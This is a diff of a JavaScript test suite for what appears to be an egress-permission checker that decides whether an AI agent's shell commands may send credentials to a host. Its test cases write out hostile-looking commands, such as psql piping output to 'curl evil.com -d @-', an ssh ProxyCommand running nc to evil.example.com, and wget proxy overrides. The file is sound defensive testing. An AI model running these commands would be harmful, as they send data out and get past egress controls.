@@ -527,12 +527,12 @@ function ownRoad(Vm) {
     // BLIND: a target the shape cannot list, a routing flag however spelled, a destination a config keeps
     ['curl https://api…/{a,b} (a glob)', R2(['curl', 'https://api.example.com/{a,b}']), 'ask:once,deny:another-host @?'],
     ['curl https://api… 2130706433 (a bare number is an address)', R2(['curl', 'https://api.example.com', '2130706433']), 'ask:once,deny:another-host @?'],
-    ['curl --unix-socket … https://api…', R2(['curl', '--unix-socket', '/tmp/s', 'https://api.example.com']), 'ask:once,deny:another-host @?'],   // int361 (主开发): an opaque route withholds «always» — the card
+    ['curl --unix-socket … https://api…', R2(['curl', '--unix-socket', '/tmp/s', 'https://api.example.com']), 'ask:once,deny:another-host @?'],
     ['curl --expand-url https://{{H}}/', R2(['curl', '--expand-url', 'https://{{H}}/'], [['H', 'evil.example.com']]), 'ask:once,deny:another-host @?'],
-    ['ssh -oProxyCommand=… api… (attached)', R2(['ssh', '-oProxyCommand=nc evil.example.com 22', 'api.example.com']), 'ask:once,deny:another-host @?'],   // int361 (主开发): an opaque route withholds «always» — the card
+    ['ssh -oProxyCommand=… api… (attached)', R2(['ssh', '-oProxyCommand=nc evil.example.com 22', 'api.example.com']), 'ask:once,deny:another-host @?'],
     ['git push https://api…/x.git (the project\'s .git/config may rewrite it)', R2(['git', 'push', 'https://api.example.com/x.git']), 'ask:once,always,deny:another-host @?'],
     ['wget -i urls.txt', R2(['wget', '-i', 'urls.txt']), 'ask:once,deny:another-host @?'],
-    ['wget -e use_proxy=on … https://api…', R2(['wget', '-e', 'use_proxy=on', 'https://api.example.com']), 'ask:once,deny:another-host @?'],   // int361 (主开发): an opaque route withholds «always» — the card
+    ['wget -e use_proxy=on … https://api…', R2(['wget', '-e', 'use_proxy=on', 'https://api.example.com']), 'ask:once,deny:another-host @?'],
     ['kubectl get pods (its kubeconfig names the server)', R2(['kubectl', 'get', 'pods']), 'ask:once,deny:another-host @?'],
     ['kubectl --server evil…:6443 (no scheme)', R2(['kubectl', '--server', 'evil.example.com:6443', 'get', 'pods']), 'ask:once,deny:another-host @evil.example.com:6443'],
     // a client's SHELL ESCAPE — the value in its env goes wherever the shell sends it (an owner's «always» never covers it either)
@@ -570,7 +570,7 @@ function ownRoad(Vm) {
     // HIGH-3: wget long-option abbreviations (getopt_long takes any unique prefix)
     ['wget --input-f=list.txt … (abbrev of --input-file)', R2b(['wget', '--input-f=list.txt', 'http://good.com/']), 'ask:once,deny:another-host @?'],
     ['wget --conf=x.rc … (abbrev of --config)', R2b(['wget', '--conf=x.rc', 'http://good.com/']), 'ask:once,deny:another-host @?'],
-    ['wget --exec=http_proxy=… (abbrev of --execute)', R2b(['wget', '--exec=http_proxy=evil:3128', 'http://good.com/']), 'ask:once,deny:another-host @?'],   // int361 (主开发): an opaque route withholds «always» — the card
+    ['wget --exec=http_proxy=… (abbrev of --execute)', R2b(['wget', '--exec=http_proxy=evil:3128', 'http://good.com/']), 'ask:once,deny:another-host @?'],
     // HIGH-4: psql -o '|cmd' pipes to a shell; abbreviations; a -f file
     ['psql -h good -o \'|curl …\' (output pipe)', R2b(['psql', '-h', 'good.com', '-o', '|curl evil.com -d @-']), 'ask:once,deny:another-host @?'],
     ['psql -h good --comm=\'\\! …\' (abbrev meta)', R2b(['psql', '-h', 'good.com', '--comm=\\! curl x']), 'ask:once,deny:another-host @?'],
@@ -606,7 +606,7 @@ function ownRoad(Vm) {
   // naming its host (its own code decides), a config file, a routing flag, the project's own code, an unknown tool, a program
   // an agent could have written; a backslash never hides the host (`https://evil\@good/` goes to evil)
   const blind = [['a shell naming its host', ['bash', '-c', 'curl https://api.example.com']], ['an interpreter naming no host', ['python3', 'x.py']], ['curl -K (a config file)', ['curl', '-K', 'c.cfg', 'https://api.example.com']],
-    ['a routing flag (ssh -o)', ['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com']], ['the project\'s own code (npm)', ['npm', 'install']], ['a tool outside the table', ['mytool', '--to', 'api.example.com']]];
+    ['a routing flag (ssh -o)', ['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com'], 'ask:once,deny:another-host'], ['the project\'s own code (npm)', ['npm', 'install']], ['a tool outside the table', ['mytool', '--to', 'api.example.com']]];
   for (const [name, argv, want = 'ask:once,deny:another-host'] of blind) { const pb = P(argv); say(`own minted · ${name} ⇒ asks`, sum(verdict(pb, fact(pb, minted('api.example.com')))), want); }
   const pw = Vm.planOf({ argv: ['psql'], env: [['T', OWN]], programWritable: true });
   say('own minted · a known tool an agent could have written ⇒ asks', sum(verdict(pw, fact(pw, minted('api.example.com')))), 'ask:once,deny:another-host');
@@ -621,8 +621,8 @@ function ownRoad(Vm) {
   const pSh2 = P(['bash', '-c', 'curl https://api.example.com/other']);
   say('…another shell command is another shape and asks', sum(verdict(pSh2, fact(pSh2, minted('api.example.com')), { instance: 'local', passes: shPass })), 'ask:once,deny:another-host');
   const pKy = P(['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com']), fKy = fact(pKy, minted('api.example.com'));
-  say('a ProxyCommand shape is an OPAQUE route — «always» is never offered, so even a live «always» row does not pass it (int361, 主开发: vault-use-grants\' opaque rule stands)', sum(verdict(pKy, fKy, { remembered: { until: null } })), 'ask:once,deny:another-host');
-  say('…an «always» that ended asks the card (no «always» offered on an opaque route)', sum(verdict(pKy, fKy, { remembered: { until: NOW0 - 1 } })), 'ask:once,deny:another-host');
+  say('an OPAQUE route (a routing flag — ssh -o ProxyCommand) never offers «always», even for a known tool naming its host: a standing pass is withheld on an opaque destination (the vault-use-grants seam ruling, round 25) — a live «always» does NOT pass it', sum(verdict(pKy, fKy, { remembered: { until: null } })), 'ask:once,deny:another-host');
+  say('…and with no live «always» the card is drawn every time (an opaque destination is never a standing pass — once / deny only, never «always»)', sum(verdict(pKy, fKy, { remembered: { until: NOW0 - 1 } })), 'ask:once,deny:another-host');
   say('…the «always» never passes a HOST (a minted value to another host + a live «always»)', sum(verdict(pAway, fact(pAway, minted('api.example.com')), { remembered: { until: null } })), 'ask:once,deny:another-host');
   say('own STORED through a shell still asks nothing', sum(verdict(pSh, fact(pSh, () => ({ own: true, prov: 'stored' })))), 'ok:own');
   const pBs = P(['http', 'https://evil.example\\@api.example.com/x']);
@@ -658,10 +658,10 @@ function ownRoad(Vm) {
   for (const [name, p, want, fh] of [
     // fixup 1 — curl: a flag that REDIRECTS the connection (--alt-svc / --interface) or a value that is an agent-writable FILE
     // (cert / ca / hsts) is blind; the real curl honours an agent's alt-svc cache and sends the whole request elsewhere
-    ['curl --alt-svc ./cache https://good.com/ (an alt-svc cache redirects)', R3(['curl', '--alt-svc', './cache', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],   // int361: --alt-svc is opaque in vault-use-grants' table too (both tables' effect) — «always» withheld, the card
+    ['curl --alt-svc ./cache https://good.com/ (an alt-svc cache redirects)', R3(['curl', '--alt-svc', './cache', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
     ['curl --cacert ./ca.pem https://good.com/ (an agent CA)', R3(['curl', '--cacert', './ca.pem', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
     ['curl --hsts ./h https://good.com/ (an agent HSTS cache)', R3(['curl', '--hsts', './h', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
-    ['curl --interface evil https://good.com/ (binds the egress)', R3(['curl', '--interface', 'evil', 'https://good.com/']), 'ask:once,always,deny:another-host @?', 'good.com'],
+    ['curl --interface evil https://good.com/ (binds the egress)', R3(['curl', '--interface', 'evil', 'https://good.com/']), 'ask:once,deny:another-host @?', 'good.com'],
     ['curl -o out.json https://good.com/ (an OUTPUT file, not a config) => allowed', R3(['curl', '-o', 'out.json', 'https://good.com/']), 'ok:own', 'good.com'],
     // fixup 2 — libpq percent-decodes a conninfo URI's query KEYWORDS (?%68ostaddr= => hostaddr=) ⇒ a % in the query is blind
     ['psql ...?%68ostaddr=10.0.0.5 (a decoded hostaddr)', R3(['psql', 'postgresql://good.com/app?%68ostaddr=10.0.0.5']), 'ask:once,deny:another-host @?', 'good.com'],
